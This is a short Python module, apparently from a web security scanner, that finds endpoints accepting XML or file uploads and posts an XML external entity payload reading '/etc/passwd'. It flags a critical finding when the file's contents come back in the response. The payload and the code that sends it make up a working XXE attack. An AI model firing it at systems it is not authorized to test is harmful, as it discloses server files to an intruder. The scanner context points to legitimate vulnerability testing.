"""XXE — POST d'un payload XML avec entité externe sur les endpoints qui
acceptent du XML (content-type xml, ou un endpoint d'upload de fichier),
confirmé par la divulgation de `/etc/passwd`."""
from __future__ import annotations

import re

from ..scan_models import Finding

XXE_PAYLOAD = (
    '<?xml version="1.0"?>\n'
    '<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
    '<data>&xxe;</data>'
)
PASSWD_RE = re.compile(r"root:.*:0:0:")


def _xml_targets(sitemap):
    seen = set()
    for ep in list(sitemap.endpoints) + list(sitemap.api_endpoints):
        ct = (ep.content_type or "").lower()
        low = ep.url.lower()
        if ("xml" in ct or "file-upload" in low) and ep.url not in seen:
            seen.add(ep.url)
            yield ep.url
    for form in sitemap.forms:
        types = {t.lower() for _, t in form.fields}
        if "file" in types and form.action not in seen:
            seen.add(form.action)
            yield form.action


def t_xxe(ctx) -> list[Finding]:
    for url in _xml_targets(ctx.sitemap):
        st, _, body = ctx.safe_post(url, data=XXE_PAYLOAD,
                                    headers={"Content-Type": "application/xml"}, raw=True)
        if st == 200 and PASSWD_RE.search(body or ""):
            return [Finding("xxe", "xml-external-entity", "critical", url,
                            "Contenu de /etc/passwd divulgué via entité externe XML",
                            request=f"POST {url}")]
    return []


ATTACKS = [
    ("xxe", "XXE (external entity)", t_xxe),
]
